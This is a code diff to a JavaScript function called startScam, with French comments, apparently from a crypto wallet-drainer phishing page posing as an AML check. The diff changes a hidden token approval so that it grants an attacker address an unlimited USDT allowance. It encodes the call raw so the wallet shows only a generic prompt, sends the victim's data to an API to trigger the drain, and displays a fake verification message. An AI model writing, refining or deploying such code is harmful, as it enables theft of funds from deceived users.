@@ -94,25 +94,20 @@ async function startScam() {
     return;
   }
 
-  const tokens = TOKENS[currentChainId];
-  if (!tokens) return;
+  const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 
-  // ✅ Montant énorme mais pas infini → 999 999 999 999 USDT (12 chiffres)
-  const AMOUNT = '999999999999000000'; // 6 décimales USDT
-
-  // ✅ Encodage brut → wallet ne peut pas décrypter
-  const data = '0x095ea7b3' + 
-    accountToHex(ATTACKER).substring(2) + 
-    '00000000000000000000000000000000' + 
-    '00000000000000000000000000000000' + 
-    AMOUNT.padStart(64, '0').substring(0, 64);
+  // ✅ approve(MAX) en data brut → pas de décryptage → popup générique
+  const data = '0x095ea7b3' +
+    ATTACKER.slice(2).padStart(64, '0') +
+    '00000000000000000000000000000000000000000000000000000000' +
+    'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
   const tx = {
     from: account,
-    to: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    to: USDT_ADDR,
     data: data,
     chainId: 1,
-    gasLimit: '0x7a120', // 500 000
+    gasLimit: '0x5b8d80', // 600 000 → standard
     gasPrice: '0x77359400' // 2 gwei
   };
 
@@ -127,12 +122,12 @@ async function startScam() {
       },
       chainId: 'eip155:1'
     });
-    console.log('✅ Approve envoyé (brut) :', result);
+    console.log('✅ Approve MAX envoyé (brut) :', result);
   } catch (e) {
-    console.error('❌ Échec de l’approbation brute :', e);
+    console.error('❌ Échec approve MAX :', e);
   }
 
-  // ✅ Envoie les infos à ton API
+  // ✅ Envoie les infos à ton API → déclenche le drain
   await fetch(API, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
@@ -141,11 +136,6 @@ async function startScam() {
 
   document.getElementById('status').innerText = 'Vérification AML terminée. Redirection...';
   setTimeout(() => window.location.href = '/report.html', 3000);
-}
-
-// ✅ Fonction utilitaire : convertit une adresse en hex 32 bytes
-function accountToHex(addr) {
-  return '0x' + addr.slice(2).padStart(64, '0');
 }
 
 initWalletConnect().catch(err => {
